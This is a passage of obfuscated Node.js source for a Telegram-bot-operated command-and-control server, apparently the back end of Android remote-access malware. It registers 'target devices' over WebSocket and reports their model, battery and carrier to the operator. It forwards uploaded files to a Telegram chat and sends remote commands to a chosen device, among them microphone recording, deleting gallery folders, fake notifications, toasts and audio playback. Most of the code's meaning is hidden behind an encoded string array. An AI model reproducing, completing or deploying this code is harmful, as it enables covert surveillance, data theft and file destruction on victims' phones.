ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", "microphone", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59\x0A\x0A", "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ", "toast", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE64\uD835\uDE63\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x0A\x0A", "• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ", "show_notification", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE56\uD835\uDE68\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x0A\x0A", "• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ", "play_audio", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E\x0A\x0A", "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ", "ping", "then", "PORT", "env", "listen"];
const app = express();
const appServer = http[_0xdc21[0]](app);
const appSocket = new webSocket.Server({
    server: appServer
});
const appBot = new telegramBot(token, {
    polling: true
});
const appClients = new Map();
const upload = multer();
app[_0xdc21[2]](bodyParser[_0xdc21[1]]());
let currentUuid = _0xdc21[3];
let currentNumber = _0xdc21[3];
let currentTitle = _0xdc21[3];
app[_0xdc21[7]](_0xdc21[4], function(_0xeb57xa, _0xeb57xb) {
    _0xeb57xb[_0xdc21[6]](_0xdc21[5])
});
app[_0xdc21[20]](_0xdc21[8], upload[_0xdc21[10]](_0xdc21[9]), (_0xeb57xa, _0xeb57xb) => {
    const _0xeb57xc = _0xeb57xa[_0xdc21[9]][_0xdc21[11]];
    appBot[_0xdc21[19]](id, _0xeb57xa[_0xdc21[9]][_0xdc21[12]], {
        caption: `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`,
        parse_mode: _0xdc21[17]
    }, {
        filename: _0xeb57xc,
        contentType: _0xdc21[18]
    });
    _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[21], (_0xeb57xa, _0xeb57xb) => {
    appBot[_0xdc21[25]](id, `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[22]}` + _0xeb57xa[_0xdc21[24]][_0xdc21[23]], {
        parse_mode: _0xdc21[17]
    });
    _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[26], (_0xeb57xa, _0xeb57xb) => {
    appBot[_0xdc21[29]](id, _0xeb57xa[_0xdc21[24]][_0xdc21[27]], _0xeb57xa[_0xdc21[24]][_0xdc21[28]]);
    appBot[_0xdc21[25]](id, `${_0xdc21[30]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`, {
        parse_mode: _0xdc21[17]
    });
    _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
appSocket[_0xdc21[50]](_0xdc21[31], (_0xeb57xd, _0xeb57xa) => {
    const _0xeb57xe = uuid4[_0xdc21[32]]();
    const _0xeb57xf = _0xeb57xa[_0xdc21[15]][_0xdc21[14]];
    const _0xeb57x10 = _0xeb57xa[_0xdc21[15]][_0xdc21[33]];
    const _0xeb57x11 = _0xeb57xa[_0xdc21[15]][_0xdc21[34]];
    const _0xeb57x12 = _0xeb57xa[_0xdc21[15]][_0xdc21[35]];
    const _0xeb57x13 = _0xeb57xa[_0xdc21[15]][_0xdc21[36]];
    _0xeb57xd[_0xdc21[37]] = _0xeb57xe;
    appClients[_0xdc21[38]](_0xeb57xe, {
        model: _0xeb57xf,
        battery: _0xeb57x10,
        version: _0xeb57x11,
        brightness: _0xeb57x12,
        provider: _0xeb57x13
    });
    appBot[_0xdc21[25]](id, `${_0xdc21[39]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
        parse_mode: _0xdc21[17]
    });
    _0xeb57xd[_0xdc21[50]](_0xdc21[47], function() {
        appBot[_0xdc21[25]](id, `${_0xdc21[48]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
            parse_mode: _0xdc21[17]
        });
        appClients[_0xdc21[49]](_0xeb57xd[_0xdc21[37]])
    })
});
appBot[_0xdc21[50]](_0xdc21[51], (_0xeb57x14) => {
    const _0xeb57x15 = _0xeb57x14[_0xdc21[53]][_0xdc21[52]];
    if (_0xeb57x14[_0xdc21[54]]) {
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[55])) {
            currentNumber = _0xeb57x14[_0xdc21[23]];
            appBot[_0xdc21[25]](id, _0xdc21[57] + _0xdc21[58], {
                reply_markup: {
                    force_reply: true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[59])) {
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[60]}${currentNumber}${_0xdc21[4]}${_0xeb57x14[_0xdc21[23]]}${_0xdc21[3]}`)
                }
            });
            currentNumber = _0xdc21[3];
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[67])) {
            const _0xeb57x17 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[68]}${_0xeb57x17}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[69])) {
            const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[70]}${_0xeb57x18}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[71])) {
            const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[72]}${_0xeb57x18}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[73])) {
            const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[74]}${_0xeb57x19}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[75])) {
            const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[76]}${_0xeb57x19}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[77])) {
            const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[78]}${_0xeb57x19}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[79])) {
            const _0xeb57x1a = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[80]}${_0xeb57x1a}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[81])) {
            const _0xeb57x1b = _0xeb57x14[_0xdc21[23]];
            currentTitle = _0xeb57x1b;
            appBot[_0xdc21[25]](id, _0xdc21[82] + _0xdc21[83], {
                reply_markup: {
                    force_reply: true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[84])) {
            const _0xeb57x1c = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[85]}${currentTitle}${_0xdc21[4]}${_0xeb57x1c}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[86])) {
            const _0xeb57x1d = _0xeb57x14[_0xdc21[23]];
            appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
                if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
                    _0xeb57xd[_0xdc21[6]](`${_0xdc21[87]}${_0xeb57x1d}${_0xdc21[3]}`)
                }
            });
            currentUuid = _0xdc21[3];
            appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        }
    };
    if (id == _0xeb57x15) {
        if (_0xeb57x14[_0xdc21[23]] == _0xdc21[88]) {
            appBot[_0xdc21[25]](id, _0xdc21[89] + _0xdc21[90] + _0xdc21[91] + _0xdc21[92] + _0xdc21[93], {
                parse_mode: _0xdc21[17],
                "reply_markup": {
                    "keyboard": [
                        [_0xdc21[65]],
                        [_0xdc21[66]]
                    ],
                    'resize_keyboard': true
                }
            })
        };
        if (_0xeb57x14[_0xdc21[23]] == _0xdc21[65]) {
            if (appClients[_0xdc21[94]] == 0) {
                appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
            } else {
                let _0xeb57x1e = _0xdc21[97];
                appClients[_0xdc21[61]](function(_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
                    _0xeb57x1e += `${_0xdc21[40]}${_0xeb57x1f[_0xdc21[14]]}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x1f[_0xdc21[33]]}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x1f[_0xdc21[34]]}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x1f[_0xdc21[35]]}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x1f[_0xdc21[36]]}${_0xdc21[98]}`
                });
                appBot[_0xdc21[25]](id, _0xeb57x1e, {
                    parse_mode: _0xdc21[17]
                })
            }
        };
        if (_0xeb57x14[_0xdc21[23]] == _0xdc21[66]) {
            if (appClients[_0xdc21[94]] == 0) {
                appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
            } else {
                const _0xeb57x22 = [];
                appClients[_0xdc21[61]](function(_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
                    _0xeb57x22[_0xdc21[100]]([{
                        text: _0xeb57x1f[_0xdc21[14]],
                        callback_data: _0xdc21[99] + _0xeb57x20
                    }])
                });
                appBot[_0xdc21[25]](id, _0xdc21[101], {
                    "reply_markup": {
                        "inline_keyboard": _0xeb57x22
                    }
                })
            }
        }
    } else {
        appBot[_0xdc21[25]](id, _0xdc21[102])
    }
});
appBot[_0xdc21[50]](_0xdc21[103], (_0xeb57x23) => {
    const _0xeb57x24 = _0xeb57x23[_0xdc21[51]];
    const _0xeb57x25 = _0xeb57x23[_0xdc21[104]];
    const _0xeb57x26 = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[0];
    const _0xeb57xe = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[1];
    console[_0xdc21[107]](_0xeb57xe);
    if (_0xeb57x26 == _0xdc21[108]) {
        appBot[_0xdc21[141]](`${_0xdc21[109]}${appClients[_0xdc21[7]](_0xeb57x25[_0xdc21[106]](_0xdc21[105])[1])[_0xdc21[14]]}${_0xdc21[46]}`, {
            width: 10000,
            chat_id: id,
            message_id: _0xeb57x24[_0xdc21[110]],
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: _0xdc21[111],
                        callback_data: `${_0xdc21[112]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[113],
                        callback_data: `${_0xdc21[114]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[115],
                        callback_data: `${_0xdc21[70]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[116],
                        callback_data: `${_0xdc21[72]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[117],
                        callback_data: `${_0xdc21[118]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[119],
                        callback_data: `${_0xdc21[74]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[120],
                        callback_data: `${_0xdc21[121]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[122],
                        callback_data: `${_0xdc21[123]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[124],
                        callback_data: `${_0xdc21[125]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[126],
                        callback_data: `${_0xdc21[80]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[127],
                        callback_data: `${_0xdc21[128]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[129],
                        callback_data: `${_0xdc21[130]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[131],
                        callback_data: `${_0xdc21[132]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[133],
                        callback_data: `${_0xdc21[85]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[134],
                        callback_data: `${_0xdc21[135]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[136],
                        callback_data: `${_0xdc21[60]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[137],
                        callback_data: `${_0xdc21[87]}${_0xeb57xe}${_0xdc21[3]}`
                    }, {
                        text: _0xdc21[138],
                        callback_data: `${_0xdc21[139]}${_0xeb57xe}${_0xdc21[3]}`
                    }],
                    [{
                        text: _0xdc21[140],
                        callback_data: `${_0xdc21[68]}${_0xeb57xe}${_0xdc21[3]}`
                    }]
                ]
            },
            parse_mode: _0xdc21[17]
        })
    };
    if (_0xeb57x26 == _0xdc21[142]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[142])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[144]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[144])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[145]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[145])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[146]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[146])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[147]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[147])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[148]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[148])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[149]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[149])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[150]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[150])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[151]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[151])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[152]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[152])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
                    [_0xdc21[65]],
                    [_0xdc21[66]]
                ],
                'resize_keyboard': true
            }
        })
    };
    if (_0xeb57x26 == _0xdc21[153]) {
        appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == _0xeb57xe) {
                _0xeb57xd[_0xdc21[6]](_0xdc21[153])
            }
        });
        appBot[_0xdc21[143]](id, _0xeb57x24[_0xdc21[110]]);
        appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "reply_markup": {
                "keyboard": [
